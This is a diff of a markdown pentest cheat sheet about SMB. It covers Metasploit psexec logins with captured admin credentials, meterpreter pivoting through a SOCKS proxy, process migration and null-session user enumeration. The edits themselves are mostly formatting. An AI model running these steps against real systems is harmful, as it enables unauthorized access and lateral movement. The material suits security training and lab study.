@@ -62,9 +62,13 @@ SMB lets you shares files , disks, directories, printers.
 5- After getting the password use metasploit 
 
 > use exploit/windows/smb/psexec
+
 > set RHOSTS 192.168.x.x
+
 > set SMBUser administrator
+
 > set SMBPass password
+
 > exploit
 
 6- After get meterpreter session , the following can add route to the specific IP **(Pivoting)**
@@ -78,11 +82,17 @@ SMB lets you shares files , disks, directories, printers.
 ![image](https://user-images.githubusercontent.com/73122852/231012959-a2223c61-e9fa-4bfc-9c52-b29427526f36.png)
 
 > background                                       (to run the current session in the backgroud)
+
 > use auxiliary/server/socks_proxy
+
 > show options
+
 > set SRVPORT PORTHere
+
 > set VERSION 4a 
+
 > exploit
+
 > jobs                                                  (to see the current jobs)
 
 ![image](https://user-images.githubusercontent.com/73122852/231013241-6174b314-59c1-4524-99d4-b65d54ade603.png)
@@ -98,6 +108,7 @@ SMB lets you shares files , disks, directories, printers.
 if that failed that because we need privilege, So back to meterpreter
 
 > migrate -N explorer.exe
+
 > net view 192.168.x2.x2
 
 
@@ -105,8 +116,7 @@ if that failed that because we need privilege, So back to meterpreter
 
 * Null Session
 
-is the one of the oldest and most known attacks performed on Windows 2000 and Windows NT environments. Thanks to this weakness, malicious users are able to establish a connection to the victim in order to
-gather information such as shares, users, groups, registry keys and much more.
+is the one of the oldest and most known attacks performed on Windows 2000 and Windows NT environments. Thanks to this weakness, malicious users are able to establish a connection to the victim in order to gather information such as shares, users, groups, registry keys and much more.
 
 Null sessions rely on Common Internet File System (CIFS) and Server Message Block (SMB) API, that return information even to an unauthenticated user.
 
@@ -142,7 +152,4 @@ Then Use enumdomusers to list all users.
 
 
 
-
-
-SNMP (Simple Network Management Protocol) : is a protocol used to both gather information and configure network devices (printers,switches,servers,....).
 
